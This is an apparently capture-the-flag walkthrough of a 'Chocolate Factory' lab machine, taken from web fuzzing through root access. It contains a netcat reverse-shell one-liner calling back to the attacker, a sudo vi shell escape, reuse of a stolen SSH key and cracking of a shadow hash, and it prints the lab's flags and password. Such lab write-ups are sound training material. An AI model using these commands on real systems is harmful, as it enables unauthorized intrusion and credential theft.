# ENUMERATION
---



## OPEN PORTS
---


| PORT | SERVICE |
| :--- | :------ |
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

We also got a bunch of other open ports but they are not relevant, all of them contain the same:

```
fingerprint-strings:
| DNSStatusRequestTCP, RTSPRequest:
| "Welcome to chocolate room!!
| ___.---------------.
| .'__'__'__'__'__,` . ____ ___ \r
| _:\x20 |:. \x20 ___ \r
| \'__'__'__'__'_`.__| `. \x20 ___ \r
| \'__'__'__\x20__'_;-----------------`
| \|______________________;________________|
| small hint from Mr.Wonka : Look somewhere else, its not here! ;)
|_ hope you wont drown Augustus"
```


# RECONNAISSANCE
---

If we go to the website, we can see a login page:

![Pasted image 20250408125526.png](../../IMAGES/Pasted%20image%2020250408125526.png)

If we submit the request to burp, we can notice that the response for this login page is weird:


![Pasted image 20250408125555.png](../../IMAGES/Pasted%20image%2020250408125555.png)

This could be vulnerable to XSS, let's try a simple payload, for example, let's try to modify it to show us the `window.origin`:


![Pasted image 20250408125722.png](../../IMAGES/Pasted%20image%2020250408125722.png)


![Pasted image 20250408125737.png](../../IMAGES/Pasted%20image%2020250408125737.png)

I tried getting the cookie but nothing came in, which means that an administrator may not be surveilling the web application, let's try fuzzing for example:

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u "http://10.10.147.138/FUZZ" -ic -c -t 200 -e .php,.html,.pdf,.js

 /'___\ /'___\ /'___\
 /\ \__/ /\ \__/ __ __ /\ \__/
 \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
 \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
 \ \_\ \ \_\ \ \____/ \ \_\
 \/_/ \/_/ \/___/ \/_/

 v2.1.0-dev
________________________________________________

 :: Method : GET
 :: URL : http://10.10.147.138/FUZZ
 :: Wordlist : FUZZ: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions : .php .html .pdf .js
 :: Follow redirects : false
 :: Calibration : false
 :: Timeout : 10
 :: Threads : 200
 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.php [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 155ms]
.html [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 155ms]
index.html [Status: 200, Size: 1466, Words: 87, Lines: 70, Duration: 159ms]
home.php [Status: 200, Size: 569, Words: 29, Lines: 32, Duration: 6632ms]
```

We got a `home.php` directory, let's take a look:


![Pasted image 20250408131240.png](../../IMAGES/Pasted%20image%2020250408131240.png)

We can execute commands, let's try `id` for example:


![Pasted image 20250408131309.png](../../IMAGES/Pasted%20image%2020250408131309.png)

Got command execution, let's begin exploitation.




# EXPLOITATION
---

Since we already know we got `RCE`, we can simply send ourselves a reverse shell using the following command:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP 9001 >/tmp/f
```


You can use any other reverse shell, once we send the command, we notice this:

![Pasted image 20250408131435.png](../../IMAGES/Pasted%20image%2020250408131435.png)

We can begin privilege escalation.


# PRIVILEGE ESCALATION
---


Let's stabilize our shell:

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
/usr/bin/script -qc /bin/bash /dev/null
CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export BASH=bash
```

![Pasted image 20250408131704.png](../../IMAGES/Pasted%20image%2020250408131704.png)

We can notice this at `/var/www/html`:

![Pasted image 20250408132425.png](../../IMAGES/Pasted%20image%2020250408132425.png)

There's something called `key_rev_key`, if we check the strings of it:

![Pasted image 20250408132450.png](../../IMAGES/Pasted%20image%2020250408132450.png)

We found a key, we can submit it as the first answer of the room:

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```


Now, let's proceed with our privilege escalation, we can notice an user at `/home` named `charlie`, inside of Charlie's home, we can see this:

![Pasted image 20250408132656.png](../../IMAGES/Pasted%20image%2020250408132656.png)

We got a `teleport` and `teleport.pub` file, this seems like a private `RSA` key:

```
www-data@chocolate-factory:/home/charlie$ file teleport
teleport: PEM RSA private key
```

There we go, let's get the key and go into ssh as Charlie:

![Pasted image 20250408132847.png](../../IMAGES/Pasted%20image%2020250408132847.png)

We can read `user.txt` now:

```
charlie@chocolate-factory:/home/charlie$ cat user.txt
flag{cd5509042371b34e4826e4838b522d2e}
```

We can see this if we use `sudo -l`:

![Pasted image 20250408133050.png](../../IMAGES/Pasted%20image%2020250408133050.png)

We got sudo permissions at `/usr/bin/vi`, let's check gtfobins:

![Pasted image 20250408133125.png](../../IMAGES/Pasted%20image%2020250408133125.png)

So, we can simply do this:

```
sudo /usr/bin/vi -c ':!/bin/bash' /dev/null
```

![Pasted image 20250408133155.png](../../IMAGES/Pasted%20image%2020250408133155.png)

There we go, we got root access, let's read `root.txt`:

![Pasted image 20250408133322.png](../../IMAGES/Pasted%20image%2020250408133322.png)

There's no `root.txt`, weird, let's check the contents of the root directory:

![Pasted image 20250408133343.png](../../IMAGES/Pasted%20image%2020250408133343.png)

There's something called `root.py`, if we take a look at it, we can see this code:

```python
from cryptography.fernet import Fernet
import pyfiglet
key=input("Enter the key: ")
f=Fernet(key)
encrypted_mess= 'gAAAAABfdb52eejIlEaE9ttPY8ckMMfHTIw5lamAWMy8yEdGPhnm9_H_yQikhR-bPy09-NVQn8lF_PDXyTo-T7CpmrFfoVRWzlm0OffAsUM7KIO_xbIQkQojwf_unpPAAKyJQDHNvQaJ'
dcrypt_mess=f.decrypt(encrypted_mess)
mess=dcrypt_mess.decode()
display1=pyfiglet.figlet_format("You Are Now The Owner Of ")
display2=pyfiglet.figlet_format("Chocolate Factory ")
print(display1)
print(display2)
```

We can simply enter the key we got from earlier:

```
-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY=
```

![Pasted image 20250408133737.png](../../IMAGES/Pasted%20image%2020250408133737.png)

We got the root flag:

```
flag{cec59161d338fef787fcb4e296b42124}
```

#### Getting the Charlie Password

Remember we got `ftp` enabled, if we go inside of it, we can see this:

![Pasted image 20250408134019.png](../../IMAGES/Pasted%20image%2020250408134019.png)

If we get it and use steghide, we can see this:

![Pasted image 20250408134124.png](../../IMAGES/Pasted%20image%2020250408134124.png)

We got something called `b64.txt`, let's decode it:

```
cat b64.txt | base64 -d
daemon:*:18380:0:99999:7:::
bin:*:18380:0:99999:7:::
sys:*:18380:0:99999:7:::
sync:*:18380:0:99999:7:::
games:*:18380:0:99999:7:::
man:*:18380:0:99999:7:::
lp:*:18380:0:99999:7:::
mail:*:18380:0:99999:7:::
news:*:18380:0:99999:7:::
uucp:*:18380:0:99999:7:::
proxy:*:18380:0:99999:7:::
www-data:*:18380:0:99999:7:::
backup:*:18380:0:99999:7:::
list:*:18380:0:99999:7:::
irc:*:18380:0:99999:7:::
gnats:*:18380:0:99999:7:::
nobody:*:18380:0:99999:7:::
systemd-timesync:*:18380:0:99999:7:::
systemd-network:*:18380:0:99999:7:::
systemd-resolve:*:18380:0:99999:7:::
_apt:*:18380:0:99999:7:::
mysql:!:18382:0:99999:7:::
tss:*:18382:0:99999:7:::
shellinabox:*:18382:0:99999:7:::
strongswan:*:18382:0:99999:7:::
ntp:*:18382:0:99999:7:::
messagebus:*:18382:0:99999:7:::
arpwatch:!:18382:0:99999:7:::
Debian-exim:!:18382:0:99999:7:::
uuidd:*:18382:0:99999:7:::
debian-tor:*:18382:0:99999:7:::
redsocks:!:18382:0:99999:7:::
freerad:*:18382:0:99999:7:::
iodine:*:18382:0:99999:7:::
tcpdump:*:18382:0:99999:7:::
miredo:*:18382:0:99999:7:::
dnsmasq:*:18382:0:99999:7:::
redis:*:18382:0:99999:7:::
usbmux:*:18382:0:99999:7:::
rtkit:*:18382:0:99999:7:::
sshd:*:18382:0:99999:7:::
postgres:*:18382:0:99999:7:::
avahi:*:18382:0:99999:7:::
stunnel4:!:18382:0:99999:7:::
sslh:!:18382:0:99999:7:::
nm-openvpn:*:18382:0:99999:7:::
nm-openconnect:*:18382:0:99999:7:::
pulse:*:18382:0:99999:7:::
saned:*:18382:0:99999:7:::
inetsim:*:18382:0:99999:7:::
colord:*:18382:0:99999:7:::
i2psvc:*:18382:0:99999:7:::
dradis:*:18382:0:99999:7:::
beef-xss:*:18382:0:99999:7:::
geoclue:*:18382:0:99999:7:::
lightdm:*:18382:0:99999:7:::
king-phisher:*:18382:0:99999:7:::
systemd-coredump:!!:18396::::::
_rpc:*:18451:0:99999:7:::
statd:*:18451:0:99999:7:::
_gvm:*:18496:0:99999:7:::
charlie:$6$CZJnCPeQWp9/jpNx$khGlFdICJnr8R3JC/jTR2r7DrbFLp8zq8469d3c0.zuKN4se61FObwWGxcHZqO2RJHkkL1jjPYeeGyIJWE82X/:18535:0:99999:7:::
```

We got a hash, let's try to crack it using hashcat:

![Pasted image 20250408140013.png](../../IMAGES/Pasted%20image%2020250408140013.png)

Password is:

```
cn7824
```


![Pasted image 20250408140034.png](../../IMAGES/Pasted%20image%2020250408140034.png)

